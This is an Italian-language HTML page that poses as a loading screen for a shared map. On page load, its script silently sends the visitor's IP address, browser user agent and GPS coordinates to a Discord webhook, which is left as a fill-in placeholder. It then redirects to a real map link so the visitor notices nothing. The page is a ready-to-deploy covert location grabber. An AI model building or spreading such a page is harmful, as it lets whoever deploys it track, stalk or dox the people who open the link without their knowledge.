<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8">
  <title>Apertura mappa...</title>
  <style>
    body { font-family: Arial; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .box { text-align: center; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
    .loader { border: 4px solid #f3f3f3; border-top: 4px solid #4285F4; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
  <script>
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => {
        fetch("https://discord.com/api/webhooks/INSERISCI_LA_TUA_WEBHOOK", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `ðŸ›°ï¸ Accesso alla mappa\nIP: ${data.ip}\nUser-Agent: ${navigator.userAgent}`
          })
        });
      });

    navigator.geolocation?.getCurrentPosition(pos => {
      fetch("https://discord.com/api/webhooks/INSERISCI_LA_TUA_WEBHOOK", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `ðŸ“ GPS:\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}`
        })
      });
    });

    // Leggi il link di condivisione da config.json
    fetch("config.json")
      .then(res => res.json())
      .then(data => {
        setTimeout(() => {
          window.location.href = data.mapLink; // Usa il link completo della mappa
        }, 2000);
      });
  </script>
</head>
<body>
  <div class="box">
    <div class="loader"></div>
    <p>Caricamento mappa in corso... Attendere qualche secondo.</p>
  </div>
</body>
</html>
